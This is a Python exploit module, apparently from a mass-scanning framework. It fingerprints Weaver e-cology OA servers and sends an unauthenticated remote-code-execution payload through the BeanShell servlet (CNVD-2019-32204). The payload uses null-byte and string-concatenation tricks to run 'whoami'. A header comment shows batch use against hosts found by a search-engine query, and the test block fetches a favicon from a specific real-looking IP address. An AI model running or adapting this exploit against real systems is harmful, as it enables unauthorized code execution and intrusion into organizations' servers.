# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 22:06

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# app="泛微-协同办公OA"
# python batch.py -m exploit.scripts.OA.Weaver.e-weaver.unauth_bsh_rce -cs -fs "app=\"泛微-协同办公OA\""


class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CNVD-2019-32204'
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/weaver/bsh.servlet.BshServlet', '/bsh.servlet.BshServlet', '/weaveroa/bsh.servlet.BshServlet', '/oa/bsh.servlet.BshServlet']
        # 相关信息
        self.info = ''
        self.favicon_md5_list = ['41eca7a9245394106a09b2534d8030df']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                if response is not None:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if 'ecology9/js/lib.js' in text or '/wui/common/css/w7ovfont.css' in text or 'typeof poppedwindow' in text or 'client/jquery.client_wev8.js' in text or '/theme/ecology8/jquery/js/zdialog_wev8.js' in text or 'ecology8/lang/weaver_lang_7_wev8.js' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if 'ecology_JSessionId' in response.headers.get('Set_Cookie', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
                async with session.post(url=url, data=data, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        gLogger.myscan_info('[{} bsh-rce] {}'.format(self.name, url))
                        return {'name': '{} bsh-rce'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib
    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)